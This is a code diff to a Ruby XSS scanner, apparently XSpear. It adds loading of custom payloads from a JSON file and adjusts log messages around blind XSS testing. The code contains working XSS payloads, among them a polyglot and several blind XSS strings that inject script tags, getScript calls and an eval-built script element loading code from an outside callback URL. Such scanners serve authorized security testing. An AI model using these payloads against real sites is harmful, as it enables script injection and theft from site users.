@@ -23,6 +23,11 @@ class XspearScan
     else
       @params = options['params'].split(",")
     end
+    if options['cp'].nil?
+      @custom_payload = nil
+    else
+      @custom_payload = File.open(options['cp'])
+    end
     if options['all'] == true
       @all = true
     else
@@ -492,10 +497,18 @@ class XspearScan
     end
     if @all == true
       log('s',"used test-all-params mode(-a)")
-      log('s',"creating a test query all param")
+      if @blind_url.nil?
+        log('s',"creating a test query all param")
+      else
+        log('s',"creating a test query all param + blind XSS")
+      end
     else
       log('s',"used test-reflected-params mode(default)")
-      log('s',"creating a test query [for reflected #{@reflected_params.length} param + blind XSS ]")
+      if @blind_url.nil?
+        log('s',"creating a test query [for reflected #{@reflected_params.length} param ]")
+      else
+        log('s',"creating a test query [for reflected #{@reflected_params.length} param + blind XSS ]")
+      end
     end
     @param_check_switch = false
     ## [ XSS Scanning ]
@@ -572,13 +585,28 @@ class XspearScan
       r.push makeQueryPattern('x', 'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(45)//>', '\'"><svg/onload=alert(45)>', 'v', "triggered ".yellow+"XSS Polyglot payload".red, CallbackXSSSelenium)
 
     end
-      # Check Blind XSS Payload
-      if !@blind_url.nil?
-        r.push makeQueryPattern('f', "\"'><script src=#{@blind_url}></script>", "BLINDNOTDETECTED", 'i', "", CallbackNotAdded)
-        r.push makeQueryPattern('f', "\"'><script>$.getScript('#{@blind_url}')</script>", "BLINDNOTDETECTED", 'i', "", CallbackNotAdded)
-        r.push makeQueryPattern('f', "\"'><svg onload=javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'#{@blind_url}\';d.body.appendChild(_)')>", "BLINDNOTDETECTED", 'i', "", CallbackNotAdded)
-        r.push makeQueryPattern('f', "\"'><iframe src=javascript:$.getScript('#{@blind_url}')></iframe>", "BLINDNOTDETECTED", 'i', "", CallbackNotAdded)
+    # Check Blind XSS Payload
+    if !@blind_url.nil?
+      r.push makeQueryPattern('f', "\"'><script src=#{@blind_url}></script>", "BLINDNOTDETECTED", 'i', "", CallbackNotAdded)
+      r.push makeQueryPattern('f', "\"'><script>$.getScript('#{@blind_url}')</script>", "BLINDNOTDETECTED", 'i', "", CallbackNotAdded)
+      r.push makeQueryPattern('f', "\"'><svg onload=javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'#{@blind_url}\';d.body.appendChild(_)')>", "BLINDNOTDETECTED", 'i', "", CallbackNotAdded)
+      r.push makeQueryPattern('f', "\"'><iframe src=javascript:$.getScript('#{@blind_url}')></iframe>", "BLINDNOTDETECTED", 'i', "", CallbackNotAdded)
+    end
+
+    if !@custom_payload.nil?
+      log('s','load custom payload')
+      cps = JSON.parse @custom_payload.read
+      cps.each do |cp|
+        if cp['callback'] == 'P1'
+          r.push makeQueryPattern('x', cp['payload'], cp['payload'], 'h', "reflected "+"Custom Payload #{cp['descript']} ".red, CallbackStringMatch)
+        elsif cp['callback'] == 'P2'
+          r.push makeQueryPattern('x', cp['payload'], 'alert(45)', 'v', "triggered ".yellow+"Custom Payload #{cp['descript']}".red, CallbackXSSSelenium)
+        else
+
+        end
       end
+      log('s',"loaded and creating #{cps.length} custom payloads")
+    end
 
     r = r.flatten
     r = r.flatten
